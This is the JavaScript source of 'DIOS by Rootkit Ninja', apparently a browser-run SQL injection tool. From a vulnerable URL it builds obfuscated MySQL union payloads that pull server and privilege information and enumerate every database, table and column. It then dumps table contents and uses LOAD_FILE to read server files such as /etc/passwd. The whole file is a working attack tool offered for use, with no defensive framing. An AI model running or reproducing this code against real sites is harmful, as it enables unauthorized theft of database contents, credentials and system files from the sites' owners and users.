$(document).ready(function () {
    let {
        urls,
        databases,
        tables,
        columns,
        database_select,
        table_select,
        columns_select,
        UUID,
        hostname,
        currentDB,
        user,
        CurrentUser,
        os,
        version,
        port,
        dataDir,
        TempDirectory,
        BITSDETAILS,
        FILESYSTEM,
        symlink,
        ssl,
        privilage,
        files_loadfile
    } = ""

    let res_thead = '<thead class="bg-gray-50" id="thead_template"></thead>'
    let res_tbody = '<tbody class="bg-white divide-y divide-gray-200" id="tbody_template"></tbody>'

    document.title = "Dios by Rootkit Ninja";
    
    function importcss(link) {
        let links = document.createElement('link')
        links.rel = 'stylesheet'
        links.href = link
        document.head.appendChild(links);
    }

    function importjs(link, async = false) {
        let script = document.createElement('script')
        script.type = "text/javascript"
        script.src = link
        script.async = (async) ? true : false
        document.head.appendChild(script)
    }

    function addMeta(httpequiv, content) {
        var meta = document.createElement('meta');
        meta.httpEquiv = httpequiv;
        meta.content = content;
        document.getElementsByTagName('head')[0].appendChild(meta);
    }

    function stringtochar(string) {
        let char = ''
        for (let index = 0; index < string.length; index++) {
            char += string.charCodeAt(index) + ","
        }
        return char.slice(0, -1)
    }

    function stringtohex(string) {
        var result = ''
        for (var i = 0; i < string.length; i++) {
            result += string.charCodeAt(i).toString(16)
        }
        return `0x${result}`
    }

    function request(url) {
        return $.ajax({
            url: url,
            success: function(data) {
                return data
            }        
        })
    }

    function regexs(output, outfile = false) {    
        let regex = (outfile) ? /(?<=<inject>)(.|\n)+(?=<\/inject>)/g : /<inject>(.*?)<\/inject>/g
        let match = regex.exec(output)

        if (outfile) return match[0]
        return match[1]
    }

    function replaceText(text, search, replace) {
        return text.replace(search, replace)
    }

    function PayloadConcat(string) {
        return `/*!50000%43o%4Ec%41t/**12345**/(${stringtohex('<inject>')},unhex(hex(/*!50000Gr%6fuP_c%6fnCAT(${string}))),${stringtohex("</inject> <!--")})*/`
    }

    let linkcss = [
        "https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.59.1/codemirror.min.css",
        "https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.59.1/theme/monokai.min.css",
        "https://unpkg.com/tailwindcss@2.0.2/dist/tailwind.min.css"
    ]

    let linkjs = [
        ["https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.29.1/moment.min.js", true],
        ["https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.59.1/codemirror.min.js", false],
        ["https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.59.1/mode/php/php.min.js", false],
        ["https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.59.1/mode/clike/clike.min.js", false],
        ["https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.59.1/mode/css/css.min.js", false],
        ["https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.59.1/mode/javascript/javascript.min.js", false],
        ["https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.59.1/mode/xml/xml.min.js", false],
        ["https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.59.1/mode/htmlmixed/htmlmixed.min.js", false],
        ["https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.59.1/addon/edit/matchbrackets.min.js", false],
    ]

    linkcss.forEach(link => {
        importcss(link)
    })

    linkjs.forEach(link => {
        importjs(link[0], link[1])
    })

    addMeta('cache-control', 'no-cache')
    addMeta('expires', '0')
    addMeta('pragma', 'no-cache')

    async function setUrl() {
        const {
            value: url
        } = await Swal.fire({
            input: 'text',
            inputLabel: 'Enter the URL With Injection \n Ex: http://localhost.com/index.php?id=-1\'union+select+1,{::},3,4+--+-',
            inputPlaceholder: 'Enter the URL'
        })

        if (url) {
            urls = url.replace(/%20/gm, '+')
            tampilan()
        }
    }

    async function tampilan() {
        $("head").append('<meta name="viewport" content="width=device-width, initial-scale=1.0">')
        $("body").addClass("bg-gray-800 overflow-auto")
        $("body").removeClass("swal2-shown")

        let template = `
    <style>
        tr:nth-child(even) {
            --tw-bg-opacity: 1;
            background-color: rgba(229,231,235,var(--tw-bg-opacity));
        }
        tr:hover {
            --tw-bg-opacity: 1;
            background-color: rgba(209, 213, 219, var(--tw-bg-opacity));
        }
    </style>
    <div class="container mx-auto">
        <img class="rounded-full flex mx-auto"
            src="https://raw.githubusercontent.com/ortod0x/rootkitninja_webshell/refs/heads/main/rootkitninja.png" width="500px" />
    </div>
    
    <div id="title" class="text-center text-3xl md:text-4xl text-purple-700 mt-5">
        <strong>DIOS by Rootkit Ninja</strong>
    </div>

    <div id="time" class="text-center text-1xl md:text-2xl mt-5 text-white"></div>
    
    <div class="flex mx-auto">
        <div id="click-menu" class="inline-flex mx-auto">
            <a id="getInfo" class="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 border border-blue-700 rounded mx-2 my-3 transform hover:scale-110 motion-reduce:transform-none">Get Information Gathering</a>
            <a id="getData" class="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 border border-blue-700 rounded mx-2 my-3 transform hover:scale-110 motion-reduce:transform-none">Get Data</a>
            <a id="loadFile" class="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 border border-blue-700 rounded mx-2 my-3 transform hover:scale-110 motion-reduce:transform-none">Load File</a>
        </div>
    </div>
    
    <div class="container mx-auto mt-4">
        <ul class="flex w-full text-gray-500 text-sm lg:text-base bg-white p-3 rounded-md mb-3" id="menuscontrol"></ul>
        <div id="form_loadfile" class="mx-auto">
        </div>
        <div class="flex flex-col" id="infos">
            <div class="-my-2 overflow-x-auto sm:-mx-6 lg:-mx-8">
                <div class="py-2 align-middle inline-block min-w-full sm:px-6 lg:px-8">
                    <div class="shadow overflow-hidden border-b border-gray-200 sm:rounded-lg">
                        <table class="min-w-full divide-y divide-gray-200" id="output">
                            <thead class="bg-gray-50" id="thead_template">
                            </thead>
                            <tbody class="bg-white divide-y divide-gray-200" id="tbody_template">
                            </tbody>
                        </table>
                        <table class="min-w-full divide-y divide-gray-200" id="output_info">
                            <thead class="bg-gray-50">
                                <th scope="col" colspan="2" class="px-6 py-3 text-center text-xs font-medium text-gray-500 uppercase tracking-wider">
                                    Information Gathering
                                </th>
                            </thead>
                            <tbody class="bg-white divide-y divide-gray-200">
                                <tr>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                                        UUID: 
                                    </td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900" id="UUID">
                                    </td>
                                </tr>
                                <tr>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                                        Host Name: 
                                    </td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900" id="hostname">
                                    </td>
                                </tr>
                                <tr>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                                        Database: 
                                    </td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900" id="currentDB">
                                    </td>
                                </tr>
                                <tr>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                                        User: 
                                    </td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900" id="user">
                                    </td>
                                </tr>
                                <tr>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                                        Current User: 
                                    </td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900" id="CurrentUser">
                                    </td>
                                </tr>
                                <tr>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                                        Operation System: 
                                    </td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900" id="os">
                                    </td>
                                </tr>
                                <tr>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                                        BITS DETAILS: 
                                    </td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900" id="BITSDETAILS">
                                    </td>
                                </tr>
                                <tr>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                                        FILE SYSTEM: 
                                    </td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900" id="FILESYSTEM">
                                    </td>
                                </tr>
                                <tr>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                                        Version: 
                                    </td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900" id="version">
                                    </td>
                                </tr>
                                <tr>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                                        Port: 
                                    </td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900" id="port">
                                    </td>
                                </tr>
                                <tr>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                                        Data Directory Location: 
                                    </td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900" id="dataDir">
                                    </td>
                                </tr>
                                <tr>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                                        Temp Directory Location: 
                                    </td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900" id="TempDirectory">
                                    </td>
                                </tr>
                                <tr>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                                        Symlink: 
                                    </td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900" id="symlink">
                                    </td>
                                </tr>
                                <tr>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                                        SSL: 
                                    </td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900" id="ssl">
                                    </td>
                                </tr>
                                <tr>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                                        Privilages / intro outfile check: 
                                    </td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900">
                                        <div id="privilage" class="w-full overflow-scroll overflow-x-scroll overflow-y-scroll h-64">
                                        </div>
                                    </td>
                                </tr>
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
        </div>
        <div class="text-white text-center mt-3 mb-3">Silent Like a Ninja - Stealth Like a Rootkit</div>
    </div>`

        $("body").html(template)
        
        setInterval(function(){
            $("#time").html(moment().format('LL, hh:mm:ss a'))
        },1000)

        $("#form_loadfile").hide()
        $("#output_info").hide()
        $("#menuscontrol").hide()

        getInfo()
        await setDatabase()

        $("#getInfo").on('click', function() {
            $("#form_loadfile").hide()
            $("#output").hide()
            $("#output_info").show()
            $("#infos").show()
        })

        $("#getData").on('click', function() {
            $("#form_loadfile").hide()
            $("#infos").show()
            $("#output").show()
            $("#output_info").hide()
        })

        $("#loadFile").on('click', function() {
            if(/YES/.test(privilage)) {
                loadFile()
                $("#form_loadfile").show()
                $("#infos").hide()
            } else {
                Swal.fire({
                    title: 'Error!',
                    text: 'The target has not vuln loadfile!',
                    icon: 'error',
                })
            }
        })

    }

    async function getInfo() {
        let urlinject = urls

        UUID = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('UUID/**ROOTKIT-NINJA**/()'))))
        hostname = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('/*!12345@@hostname'))))
        currentDB = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('database/**ROOTKIT-NINJA**/()'))))
        user = await regexs(await request(await replaceText(urlinject, '{::}', PayloadConcat('user/**ROOTKIT-NINJA**/()'))))
        CurrentUser = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('current_user/**ROOTKIT-NINJA**/()'))))
        os = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('/*!00000@@version_compile_os'))))
        version = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('/*!12345@@version'))))
        port = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('/*!12345@@port'))))
        dataDir = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('/*!00000@@datadir'))))
        TempDirectory = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('/*!12345@@tmpdir'))))
        BITSDETAILS = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('/*!12345@@version_compile_machine'))))
        FILESYSTEM = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('/*!12345@@CHARACTER_SET_FILESYSTEM'))))
        symlink = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('/*!00000@@GLOBAL.have_symlink'))))
        ssl = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('/*!00000@@GLOBAL.have_ssl'))))
        privilage = await regexs(await replaceText(await request(await replaceText(urlinject, '{::}', PayloadConcat('(SELECT+GROUP_CONCAT(GRANTEE,0x202d3e20,IS_GRANTABLE,0x3c62723e)+FROM+INFORMATION_SCHEMA.USER_PRIVILEGES)'))), /,/gm,""))

        let arr = ['UUID','hostname','currentDB','user','CurrentUser','os','version','port','dataDir','TempDirectory','BITSDETAILS','FILESYSTEM','symlink','ssl','privilage']

        await arr.forEach(element => {
            $(`#${element}`).html(eval(element))
        })
    }

    async function setDatabase() {
        let urlinject = urls
        $("#showtable").hide()
        $("#showcolum").hide()
        $("#data").html('')
        urlinject = await replaceText(urlinject, '{::}', PayloadConcat('schema_name'))
        urlinject = await replaceText(urlinject, '+--+-', '+from+/*!50000inforMAtion_schema*/.schemata+--+-')
        databases = await regexs( await request (urlinject) )
        viewDatabase()
    }

    async function viewDatabase() {
        let splitdb = databases.split(",")
        let thead_col = ["No.", "Databases", "Action"]
        let number = 1

        $("#output").html(res_thead + res_tbody)
        $("#menuscontrol").hide()

        thead_col.forEach(col => {
            $("#thead_template").append(`
                <th scope="col" class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                    ${col}
                </th>
            `)
        })

        splitdb.forEach(db => {
            $("#tbody_template").append(`
            <tr>
                <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                    ${number}
                </td>
                <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900">
                    ${db}
                </td>
                <td>
                    <div class="flex items-center">
                        <button class="bg-blue-500 hover:bg-blue-400 text-white font-bold py-2 px-4 rounded border-b-4 border-blue-700 hover:border-blue-500 transform hover:scale-110 motion-reduce:transform-none" data-database="${db}">
                            Show Table
                        </button>
                    </div>
                </td>
            </tr>
        `)
            number++
        })

        $("button").on('click', function () {
            setTable($(this).data('database'))
        })
    }

    async function setTable(database) {
        let urlinject = urls
        database_select = database
        $("#data").html(database)
        urlinject = await replaceText(urlinject, '{::}', PayloadConcat('table_name'))
        urlinject = await replaceText(urlinject, '+--+-', `+from+/*!50000inforMAtion_schema*/.tables+/*!50000wHEre*/+/*!50000taBLe_scheMA*/like+${stringtohex(database)}+--+-`)
        tables = await regexs(await request(urlinject))
        viewTable()
    }

    async function viewTable() {
        let splitable = tables.split(",")
        let number = 1
        let thead_col = ["No.", "Tables", "Action"]

        $("#output").html(res_thead + res_tbody)
        $("#menuscontrol").show()

        thead_col.forEach(col => {
            $("#thead_template").append(`
                <th scope="col" class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                    ${col}
                </th>
            `)
        })

        splitable.forEach(table => {
            $("#tbody_template").append(`
                <tr>
                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                        ${number}
                    </td>
                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900">
                        ${table}
                    </td>
                    <td>
                        <div class="flex items-center">
                            <button class="bg-blue-500 hover:bg-blue-400 text-white font-bold py-2 px-4 border-b-4 border-blue-700 hover:border-blue-500 rounded transform hover:scale-110 motion-reduce:transform-none" data-table="${table}">
                                Show Data
                            </button>
                        </div>
                    </td>
                </tr>
            `)
            number++
        })

        $("#menuscontrol").html(`
        <li class="inline-flex items-center">
            <a id="backdb" class="cursor-pointer">Home</a>
            <svg
                class="h-5 w-auto text-gray-400"
                fill="currentColor"
                viewBox="0 0 20 20"
            >
                <path
                fill-rule="evenodd"
                d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z"
                clip-rule="evenodd"
                ></path>
            </svg>
        </li>
        <li class="inline-flex items-center">
            <a class="text-purple-800">${database_select}</a>
        </li>
        `)

        $("#backdb").on('click', function () {
            viewDatabase()
        })

        $("button").on('click', function () {
            setColumns($(this).data('table'))
        })
    }

    async function setColumns(table) {
        let urlinjection = urls
        table_select = table
        urlinjection = await replaceText(urlinjection, '{::}', PayloadConcat('column_name'))
        urlinjection = await replaceText(urlinjection, '+--+-', `+from+/*!50000inforMAtion_schema*/.columns+/*!50000wHEre*/+/*!50000taBLe_name*/=CHAR(${stringtochar(table)})+--+-`)
        columns = await regexs(await request(urlinjection))
        viewColumns()
    }

    async function viewColumns() {
        let splitcolumns = columns.split(",")
        $("#output").html(res_thead + res_tbody)
        $("#menuscontrol").show()

        splitcolumns.forEach(col => {
            $("#thead_template").append(`
                <th scope="col" class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                    ${col}
                </th>
            `)
        })

        $("#menuscontrol").html(`
        <li class="inline-flex items-center">
            <a id="backdb" class="cursor-pointer">Home</a>
            <svg
            class="h-5 w-auto text-gray-400"
            fill="currentColor"
            viewBox="0 0 20 20"
            >
            <path
                fill-rule="evenodd"
                d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z"
                clip-rule="evenodd"
            ></path>
            </svg>
        </li>
        <li class="inline-flex items-center">
            <a id="backtable" class="cursor-pointer">${database_select}</a>
            <svg
            class="h-5 w-auto text-gray-400"
            fill="currentColor"
            viewBox="0 0 20 20"
            >
            <path
                fill-rule="evenodd"
                d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z"
                clip-rule="evenodd"
            ></path>
            </svg>
        </li>
        <li class="inline-flex items-center">
            <a class="text-purple-800">${table_select}</a>
        </li>
        `)

        $("#backtable").on('click', function () {
            viewTable()
        })

        $("#backdb").on('click', function () {
            viewDatabase()
        })

        setData(table_select)
    }

    async function setData(table) {
        columns_select = await replaceText(columns, /,/g, `,${stringtohex('{:::}')},`) + ',' + stringtohex('(:::)')
        let urlinjection = urls
        urlinjection = await replaceText(urlinjection,'{::}', PayloadConcat(columns_select))
        urlinjection = await replaceText(urlinjection,'+--+-', `+from+${database_select}.${table}+--+-`)
        dataTable = await regexs(await replaceText(await request(urlinjection), /(\r\n|\n|\r)/gm, ""))
        viewData()
    }

    async function viewData() {
        let splitData = dataTable.split("(:::)")
        let template_tbodys = ""

        for (let index = 0; index < splitData.length; index++) {
            template_tbodys += "<tr>"
            let splitDatacol = splitData[index].split("{:::}")
            splitDatacol.forEach(dataCol => {
                template_tbodys += `
                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                        ${dataCol}
                    </td>
                `
            })
            template_tbodys += "</tr>"
        }
        $("#tbody_template").append(template_tbodys)
    }

    async function loadFile() {
        $("#form_loadfile").html(`
        <div class="grid grid-cols-1 w-full">
            <span class="text-white mr-4">File: </span>
            <input id="file_loadfile" class="rounded form-input w-full mt-1 block p-1" placeholder="/etc/passwd" />
        </div>
        <div class="grid grid-cols-1 w-full mt-2">
            <span class="text-white mr-4">Output: </span>
            <textarea id="output_loadfile"></textarea>
        </div>
        <div class="grid grid-cols-1 w-full mt-4">
            <button id="view_loadfile" class="bg-blue-500 hover:bg-blue-400 text-white font-bold py-2 px-4 border-b-4 border-blue-700 hover:border-blue-500 rounded transform hover:scale-110 motion-reduce:transform-none">
                View File
            </button>
        </div>
        `)

        var editor = await CodeMirror.fromTextArea($("#output_loadfile")[0], {
            lineNumbers: true,
            matchBrackets: true,
            mode: "application/x-httpd-php",
            indentUnit: 4,
            indentWithTabs: true,
            theme: 'monokai'
        })

        $("#view_loadfile").on('click', async function() {
            let urlinject = urls
            files_loadfile = stringtohex($("#file_loadfile").val())
            let outpus = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat(`/*!12345%4co%41d_%46i%4ce/**ROOTKIT-NINJA**/(${files_loadfile})`))), true)
            editor.setValue(outpus)
        })
    }

    setUrl()
})
